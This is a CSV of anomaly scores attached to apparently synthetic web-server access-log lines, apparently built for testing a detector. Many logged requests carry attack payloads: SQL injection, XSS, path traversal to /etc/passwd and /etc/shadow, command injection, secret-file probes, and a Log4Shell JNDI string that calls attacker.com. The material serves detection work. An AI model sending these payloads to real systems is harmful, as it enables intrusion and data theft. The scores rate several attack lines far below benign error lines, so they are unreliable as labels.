score_content,score_session,score_fused,score_fused_norm,line
1.969722867012024,,1.969722867012024,1.969722867012024,161.137.216.43 - - [10/Jan/2025:12:00:32 +0100] "GET /admin HTTP/1.1" 200 12395 "https://www.google.com/" "dirb/2.22"
27.56940269470215,,27.56940269470215,27.56940269470215,182.9.70.106 - - [10/Jan/2025:12:00:36 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 302 10405 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.776979446411133,,24.776979446411133,24.776979446411133,45.29.96.201 - - [10/Jan/2025:12:00:37 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 10006 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.813344955444336,,4.813344955444336,4.813344955444336,40.49.88.237 - - [10/Jan/2025:12:00:37 +0100] "GET /admin HTTP/1.1" 304 16485 "https://twitter.com/" "nikto/2.5.0"
3.0077872276306152,,3.0077872276306152,3.0077872276306152,211.252.241.133 - - [10/Jan/2025:12:00:39 +0100] "GET /assets/app.css HTTP/1.1" 304 3319 "https://www.google.com/" "sqlmap/1.5.10#stable"
24.735450744628906,,24.735450744628906,24.735450744628906,30.2.80.239 - - [10/Jan/2025:12:00:40 +0100] "GET /search?q=camera HTTP/1.1" 200 17216 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2464592605829239,,0.2464592605829239,0.2464592605829239,6.148.195.80 - - [10/Jan/2025:12:00:40 +0100] "GET /wp-login.php HTTP/1.1" 200 10339 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
25.006004333496094,,25.006004333496094,25.006004333496094,172.31.70.39 - - [10/Jan/2025:12:00:41 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 14554 "https://example.com/" "curl/7.68.0"
0.2758253216743469,,0.2758253216743469,0.2758253216743469,141.82.70.37 - - [10/Jan/2025:12:00:41 +0100] "GET /.git/config HTTP/1.1" 200 11579 "https://twitter.com/" "python-requests/2.31.0"
24.77924156188965,,24.77924156188965,24.77924156188965,139.114.13.34 - - [10/Jan/2025:12:00:42 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 201 11199 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.5076639652252197,,0.5076639652252197,0.5076639652252197,101.46.181.153 - - [10/Jan/2025:12:00:47 +0100] "GET /.env HTTP/1.1" 200 14074 "https://twitter.com/" "nikto/2.5.0"
27.41680908203125,,27.41680908203125,27.41680908203125,21.250.237.194 - - [10/Jan/2025:12:00:49 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 302 17581 "https://twitter.com/" "nikto/2.5.0"
0.16191606223583221,,0.16191606223583221,0.16191606223583221,176.165.182.197 - - [10/Jan/2025:12:00:50 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 10270 "https://news.ycombinator.com/" "nikto/2.5.0"
30121.943359375,,30121.943359375,30121.943359375,67.234.94.101 - - [10/Jan/2025:12:00:51 +0100] "GET /assets/app.css HTTP/1.1" 401 1263 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.939888834953308,,1.939888834953308,1.939888834953308,90.123.119.217 - - [10/Jan/2025:12:00:53 +0100] "GET /admin HTTP/1.1" 200 3799 "https://example.com/" "curl/7.68.0"
0.1719106286764145,,0.1719106286764145,0.1719106286764145,210.183.204.28 - - [10/Jan/2025:12:00:55 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13393 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.78740119934082,,24.78740119934082,24.78740119934082,152.106.62.159 - - [10/Jan/2025:12:01:00 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 13233 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.70258903503418,,24.70258903503418,24.70258903503418,209.178.152.111 - - [10/Jan/2025:12:01:01 +0100] "GET /search?q=laptop HTTP/1.1" 200 6923 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.58295249938965,,24.58295249938965,24.58295249938965,190.239.183.147 - - [10/Jan/2025:12:01:03 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2652 "-" "nikto/2.5.0"
24.842283248901367,,24.842283248901367,24.842283248901367,46.79.245.104 - - [10/Jan/2025:12:01:07 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14688 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.46998175978660583,,0.46998175978660583,0.46998175978660583,24.56.210.36 - - [10/Jan/2025:12:01:07 +0100] "GET /.env HTTP/1.1" 200 2114 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.803672790527344,,24.803672790527344,24.803672790527344,115.51.53.175 - - [10/Jan/2025:12:01:12 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 19037 "https://example.com/" "sqlmap/1.5.10#stable"
30123.744140625,,30123.744140625,30123.744140625,184.252.235.89 - - [10/Jan/2025:12:01:16 +0100] "GET /logout HTTP/1.1" 404 890 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30122.244140625,,30122.244140625,30122.244140625,16.95.231.141 - - [10/Jan/2025:12:01:16 +0100] "GET /.env HTTP/1.1" 401 602 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.730979919433594,,24.730979919433594,24.730979919433594,222.8.61.111 - - [10/Jan/2025:12:01:21 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 9347 "https://example.com/" "dirb/2.22"
0.4841562509536743,,0.4841562509536743,0.4841562509536743,170.45.122.36 - - [10/Jan/2025:12:01:26 +0100] "GET /.env HTTP/1.1" 200 7021 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
30123.5859375,,30123.5859375,30123.5859375,74.224.172.33 - - [10/Jan/2025:12:01:29 +0100] "GET /profile HTTP/1.1" 400 315 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.9705286026000977,,2.9705286026000977,2.9705286026000977,169.112.250.254 - - [10/Jan/2025:12:01:29 +0100] "GET /../../etc/passwd HTTP/1.1" 302 16048 "-" "curl/7.68.0"
30123.412109375,,30123.412109375,30123.412109375,155.239.109.160 - - [10/Jan/2025:12:01:30 +0100] "GET /server-status HTTP/1.1" 401 1424 "https://news.ycombinator.com/" "curl/7.68.0"
0.15218816697597504,,0.15218816697597504,0.15218816697597504,48.109.155.2 - - [10/Jan/2025:12:01:34 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 7497 "https://www.google.com/" "nikto/2.5.0"
30123.54296875,,30123.54296875,30123.54296875,94.9.251.10 - - [10/Jan/2025:12:01:39 +0100] "GET /server-status HTTP/1.1" 404 1180 "https://example.com/" "nikto/2.5.0"
1.8241080045700073,,1.8241080045700073,1.8241080045700073,252.220.252.193 - - [10/Jan/2025:12:01:39 +0100] "GET /phpmyadmin HTTP/1.1" 200 17349 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.7772384881973267,,1.7772384881973267,1.7772384881973267,176.163.139.205 - - [10/Jan/2025:12:01:43 +0100] "GET /phpmyadmin HTTP/1.1" 200 2658 "https://twitter.com/" "python-requests/2.31.0"
2.1849942207336426,,2.1849942207336426,2.1849942207336426,232.121.147.188 - - [10/Jan/2025:12:01:43 +0100] "GET / HTTP/1.1" 200 16898 "https://news.ycombinator.com/" "curl/7.68.0"
1.905977725982666,,1.905977725982666,1.905977725982666,178.237.153.192 - - [10/Jan/2025:12:01:45 +0100] "GET /logout HTTP/1.1" 200 1257 "https://twitter.com/" "curl/7.68.0"
25.054889678955078,,25.054889678955078,25.054889678955078,14.169.254.75 - - [10/Jan/2025:12:01:47 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 18871 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30123.51171875,,30123.51171875,30123.51171875,65.34.158.72 - - [10/Jan/2025:12:01:50 +0100] "GET /phpmyadmin HTTP/1.1" 401 569 "https://example.com/" "python-requests/2.31.0"
30122.14453125,,30122.14453125,30122.14453125,169.115.95.207 - - [10/Jan/2025:12:01:50 +0100] "GET /assets/app.js HTTP/1.1" 404 309 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.896899700164795,,2.896899700164795,2.896899700164795,88.252.22.248 - - [10/Jan/2025:12:01:55 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 304 1184 "https://twitter.com/" "curl/7.68.0"
27.55762481689453,,27.55762481689453,27.55762481689453,170.113.186.164 - - [10/Jan/2025:12:01:56 +0100] "GET /search?q=phone HTTP/1.1" 304 7897 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8885555267333984,,1.8885555267333984,1.8885555267333984,194.210.30.14 - - [10/Jan/2025:12:02:00 +0100] "GET /profile HTTP/1.1" 200 8763 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.84431266784668,,27.84431266784668,27.84431266784668,60.98.175.181 - - [10/Jan/2025:12:02:03 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 302 17549 "https://news.ycombinator.com/" "dirb/2.22"
1.7411644458770752,,1.7411644458770752,1.7411644458770752,98.174.81.247 - - [10/Jan/2025:12:02:05 +0100] "GET /server-status HTTP/1.1" 200 14806 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.7227097749710083,,1.7227097749710083,1.7227097749710083,86.70.69.206 - - [10/Jan/2025:12:02:09 +0100] "GET /server-status HTTP/1.1" 200 9032 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.9854867458343506,,2.9854867458343506,2.9854867458343506,188.173.151.198 - - [10/Jan/2025:12:02:14 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 304 8023 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.09161274135112762,,0.09161274135112762,0.09161274135112762,173.3.213.18 - - [10/Jan/2025:12:02:16 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 446 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.15888886153697968,,0.15888886153697968,0.15888886153697968,65.50.9.7 - - [10/Jan/2025:12:02:16 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 9383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30147.8125,,30147.8125,30147.8125,32.182.246.31 - - [10/Jan/2025:12:02:20 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 429 1306 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30121.92578125,,30121.92578125,30121.92578125,48.65.76.120 - - [10/Jan/2025:12:02:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 403 1424 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8057423830032349,,1.8057423830032349,1.8057423830032349,71.199.16.98 - - [10/Jan/2025:12:02:23 +0100] "GET /dashboard HTTP/1.1" 200 2524 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.966718673706055,,24.966718673706055,24.966718673706055,126.251.238.52 - - [10/Jan/2025:12:02:23 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2374 "https://www.google.com/" "dirb/2.22"
0.17442499101161957,,0.17442499101161957,0.17442499101161957,56.158.165.28 - - [10/Jan/2025:12:02:28 +0100] "GET /../../etc/passwd HTTP/1.1" 200 14231 "https://example.com/" "nikto/2.5.0"
1.7959853410720825,,1.7959853410720825,1.7959853410720825,199.115.5.230 - - [10/Jan/2025:12:02:28 +0100] "GET /phpmyadmin HTTP/1.1" 200 8311 "https://www.google.com/" "nikto/2.5.0"
3.012066602706909,,3.012066602706909,3.012066602706909,39.180.85.232 - - [10/Jan/2025:12:02:33 +0100] "GET /wp-login.php HTTP/1.1" 301 8830 "https://twitter.com/" "dirb/2.22"
25.039369583129883,,25.039369583129883,25.039369583129883,217.187.200.208 - - [10/Jan/2025:12:02:33 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 13335 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
25.051658630371094,,25.051658630371094,25.051658630371094,240.254.92.86 - - [10/Jan/2025:12:02:34 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 17640 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.8060107231140137,,1.8060107231140137,1.8060107231140137,21.216.118.195 - - [10/Jan/2025:12:02:34 +0100] "GET /phpmyadmin HTTP/1.1" 200 11243 "https://www.google.com/" "python-requests/2.31.0"
0.48877811431884766,,0.48877811431884766,0.48877811431884766,179.100.230.28 - - [10/Jan/2025:12:02:35 +0100] "GET /.env HTTP/1.1" 204 9893 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
27.48527717590332,,27.48527717590332,27.48527717590332,10.50.7.185 - - [10/Jan/2025:12:02:35 +0100] "GET /search?q=camera HTTP/1.1" 302 4685 "https://www.google.com/" "python-requests/2.31.0"
24.792144775390625,,24.792144775390625,24.792144775390625,248.5.10.87 - - [10/Jan/2025:12:02:38 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 14822 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.29253119230270386,,0.29253119230270386,0.29253119230270386,118.241.174.223 - - [10/Jan/2025:12:02:43 +0100] "GET /.git/config HTTP/1.1" 200 17241 "https://twitter.com/" "curl/7.68.0"
3.1071646213531494,,3.1071646213531494,3.1071646213531494,168.5.121.233 - - [10/Jan/2025:12:02:44 +0100] "GET /index.html HTTP/1.1" 302 16120 "-" "python-requests/2.31.0"
0.1759253591299057,,0.1759253591299057,0.1759253591299057,232.79.211.204 - - [10/Jan/2025:12:02:45 +0100] "GET /assets/app.css HTTP/1.1" 200 1737 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30123.51953125,,30123.51953125,30123.51953125,30.128.153.205 - - [10/Jan/2025:12:02:49 +0100] "GET /phpmyadmin HTTP/1.1" 400 217 "-" "Wget/1.20.3 (linux-gnu)"
0.5212064981460571,,0.5212064981460571,0.5212064981460571,140.36.83.215 - - [10/Jan/2025:12:02:50 +0100] "GET /.env HTTP/1.1" 200 18973 "-" "Wget/1.20.3 (linux-gnu)"
1.7829399108886719,,1.7829399108886719,1.7829399108886719,194.107.44.179 - - [10/Jan/2025:12:02:54 +0100] "GET /phpmyadmin HTTP/1.1" 200 4728 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.2532314956188202,,0.2532314956188202,0.2532314956188202,200.41.5.226 - - [10/Jan/2025:12:02:55 +0100] "GET /wp-login.php HTTP/1.1" 200 12425 "-" "nikto/2.5.0"
4.621002674102783,,4.621002674102783,4.621002674102783,228.73.107.178 - - [10/Jan/2025:12:02:55 +0100] "GET /phpmyadmin HTTP/1.1" 302 19555 "https://www.google.com/" "nikto/2.5.0"
25.003162384033203,,25.003162384033203,25.003162384033203,62.241.45.157 - - [10/Jan/2025:12:02:56 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 13601 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9600701332092285,,1.9600701332092285,1.9600701332092285,90.108.2.143 - - [10/Jan/2025:12:02:57 +0100] "GET /about HTTP/1.1" 201 9969 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.914523720741272,,1.914523720741272,1.914523720741272,130.57.119.198 - - [10/Jan/2025:12:02:57 +0100] "GET /contact HTTP/1.1" 201 17785 "https://www.google.com/" "sqlmap/1.5.10#stable"
3.1194443702697754,,3.1194443702697754,3.1194443702697754,128.46.41.172 - - [10/Jan/2025:12:02:59 +0100] "GET /.git/config HTTP/1.1" 304 15645 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.606164932250977,,24.606164932250977,24.606164932250977,158.207.228.195 - - [10/Jan/2025:12:03:04 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 11054 "-" "nikto/2.5.0"
0.20409688353538513,,0.20409688353538513,0.20409688353538513,125.132.30.19 - - [10/Jan/2025:12:03:04 +0100] "GET /assets/app.js HTTP/1.1" 200 1052 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7286373376846313,,1.7286373376846313,1.7286373376846313,59.200.29.84 - - [10/Jan/2025:12:03:08 +0100] "GET /server-status HTTP/1.1" 200 10772 "-" "Wget/1.20.3 (linux-gnu)"
1.8536289930343628,,1.8536289930343628,1.8536289930343628,19.121.150.125 - - [10/Jan/2025:12:03:09 +0100] "GET /api/products HTTP/1.1" 200 7330 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.16864730417728424,,0.16864730417728424,0.16864730417728424,35.118.185.50 - - [10/Jan/2025:12:03:10 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 12338 "https://example.com/" "sqlmap/1.5.10#stable"
2.9913902282714844,,2.9913902282714844,2.9913902282714844,72.35.29.219 - - [10/Jan/2025:12:03:11 +0100] "GET /wp-login.php HTTP/1.1" 301 2054 "https://news.ycombinator.com/" "nikto/2.5.0"
24.826704025268555,,24.826704025268555,24.826704025268555,155.41.203.204 - - [10/Jan/2025:12:03:14 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 9771 "https://twitter.com/" "curl/7.68.0"
1.983721137046814,,1.983721137046814,1.983721137046814,126.221.56.152 - - [10/Jan/2025:12:03:18 +0100] "GET /about HTTP/1.1" 200 17197 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
4.510888576507568,,4.510888576507568,4.510888576507568,64.84.112.149 - - [10/Jan/2025:12:03:20 +0100] "GET /server-status HTTP/1.1" 302 8182 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
2.140986442565918,,2.140986442565918,2.140986442565918,11.254.121.188 - - [10/Jan/2025:12:03:21 +0100] "GET / HTTP/1.1" 200 1549 "-" "python-requests/2.31.0"
27.838951110839844,,27.838951110839844,27.838951110839844,116.127.62.22 - - [10/Jan/2025:12:03:24 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 304 3311 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.75298309326172,,24.75298309326172,24.75298309326172,5.123.172.79 - - [10/Jan/2025:12:03:25 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 3073 "https://news.ycombinator.com/" "curl/7.68.0"
11023.119140625,,11023.119140625,11023.119140625,198.36.224.181 - - [10/Jan/2025:12:03:29 +0100] "GET / HTTP/1.1" 500 949 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30123.7421875,,30123.7421875,30123.7421875,99.229.177.86 - - [10/Jan/2025:12:03:31 +0100] "GET /admin HTTP/1.1" 401 144 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.670529842376709,,4.670529842376709,4.670529842376709,159.226.86.189 - - [10/Jan/2025:12:03:34 +0100] "GET /api/products HTTP/1.1" 304 2752 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2521398365497589,,0.2521398365497589,0.2521398365497589,120.159.11.94 - - [10/Jan/2025:12:03:39 +0100] "GET /wp-login.php HTTP/1.1" 200 12079 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.7905278205871582,,1.7905278205871582,1.7905278205871582,36.252.86.62 - - [10/Jan/2025:12:03:44 +0100] "GET /phpmyadmin HTTP/1.1" 200 6808 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.645644187927246,,4.645644187927246,4.645644187927246,83.91.230.69 - - [10/Jan/2025:12:03:49 +0100] "GET /api/products HTTP/1.1" 302 7487 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.751873016357422,,24.751873016357422,24.751873016357422,129.135.213.32 - - [10/Jan/2025:12:03:51 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 16032 "https://twitter.com/" "nikto/2.5.0"
1.9336216449737549,,1.9336216449737549,1.9336216449737549,205.173.243.178 - - [10/Jan/2025:12:03:56 +0100] "GET /logout HTTP/1.1" 200 12163 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30122.326171875,,30122.326171875,30122.326171875,246.245.20.28 - - [10/Jan/2025:12:03:59 +0100] "GET /.env HTTP/1.1" 403 590 "https://example.com/" "curl/7.68.0"
25.017213821411133,,25.017213821411133,25.017213821411133,134.244.161.6 - - [10/Jan/2025:12:03:59 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 6793 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.17333804070949554,,0.17333804070949554,0.17333804070949554,114.189.166.6 - - [10/Jan/2025:12:04:04 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13866 "https://www.google.com/" "python-requests/2.31.0"
30146.544921875,,30146.544921875,30146.544921875,166.86.106.149 - - [10/Jan/2025:12:04:04 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 400 1064 "https://example.com/" "sqlmap/1.5.10#stable"
0.18676380813121796,,0.18676380813121796,0.18676380813121796,34.230.203.79 - - [10/Jan/2025:12:04:07 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 18687 "https://example.com/" "curl/7.68.0"
27.585166931152344,,27.585166931152344,27.585166931152344,38.91.73.117 - - [10/Jan/2025:12:04:08 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 304 1650 "https://twitter.com/" "curl/7.68.0"
